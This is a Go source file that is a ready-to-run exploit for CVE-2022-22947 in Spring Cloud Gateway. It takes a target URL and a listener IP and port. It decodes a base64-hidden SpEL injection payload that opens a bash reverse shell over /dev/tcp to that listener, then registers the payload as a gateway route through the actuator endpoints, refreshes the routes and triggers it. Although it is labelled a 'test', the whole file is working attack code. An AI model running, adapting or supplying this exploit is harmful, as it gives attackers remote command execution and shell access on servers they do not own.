package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"
)

func randomStr() string {
	var randomlength int = 8
	rand.Seed(time.Now().UnixNano())
	strArr := []string{"a", "b", "c", "d", "e", "f", "g", "h",
		"i", "g", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E",
		"F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"}
	str1 := ""
	for i := 0; i < randomlength; i++ {
		str1 += strArr[rand.Intn(52)]
	}
	return str1
}

func createHttp1(url, data string) *http.Response {
	var bytedata = []byte(data)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(bytedata))
	if err != nil {
		panic(err)
	}
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept", "*/*")
	req.Header.Add("Accept-Language", "en")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36")
	req.Header.Add("Connection", "close")
	req.Header.Add("Content-Type", "application/json")
	var client http.Client
	rep, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	return rep
}

func createHttp2(url string) *http.Response {
	req, err := http.NewRequest("POST", url, nil)
	if err != nil {
		panic(err)
	}
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9")
	req.Header.Add("Connection", "close")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", "0")
	var client http.Client
	rep, err := client.Do(req)
	if err != nil {
		panic(err)
	}

	return rep
}

func main() {
	fmt.Println("[*] CVE-2022-22947 test starting")
	reader1 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input url: ")
	url1, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}
	reader2 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input shell_exec ip: ")
	ip, _, err := reader2.ReadLine()
	if err != nil {
		panic(err)
	}
	reader3 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input shell_exec port: ")
	port, _, err := reader3.ReadLine()
	if err != nil {
		panic(err)
	}
	shell := "eyAiaWQiOiAic2hlbGwiLCAiZmlsdGVycyI6IFt7ICJuYW1lIjogIkFkZFJlc3BvbnNlSGVhZGVyIiwgImFyZ3MiOiB7ICJuYW1lIjogIlJlc3VsdCIsICJ2YWx1ZSI6ICIje25ldyBTdHJpbmcoVChvcmcuc3ByaW5nZnJhbWV3b3JrLnV0aWwuU3RyZWFtVXRpbHMpLmNvcHlUb0J5dGVBcnJheShUKGphdmEubGFuZy5SdW50aW1lKS5nZXRSdW50aW1lKCkuZXhlYyhuZXcgU3RyaW5nW117XCIvYmluL2Jhc2hcIixcIi1jXCIsXCJiYXNoIC1pID4mIC9kZXYvdGNwL0xfSVAvTF9QT1JUIDA+JjFcIn0pLmdldElucHV0U3RyZWFtKCkpKX0iIH0gfV0sICJ1cmkiOiAiaHR0cDovL2V4YW1wbGUuY29tIiB9"
	res1, _ := base64.StdEncoding.DecodeString(shell)
	rStr := randomStr()
	string1 := strings.Replace(string(res1), "L_IP", string(ip), 1)
	string1 = strings.Replace(string1, "L_PORT", string(port), 1)
	string1 = strings.Replace(string1, "shell", rStr, 1)
	path1 := "/actuator/gateway/routes/" + rStr
	path2 := "/actuator/gateway/refresh"
	path3 := "/actuator/gateway/routes/" + rStr
	rep := createHttp1(string(url1)+path1, string1)
	rep1 := createHttp2(string(url1) + path2)
	rep3, err := http.Get(string(url1) + path3)
	fmt.Println(rep.Status)
	fmt.Println(rep1.Status)
	fmt.Println(rep3.Status)
}
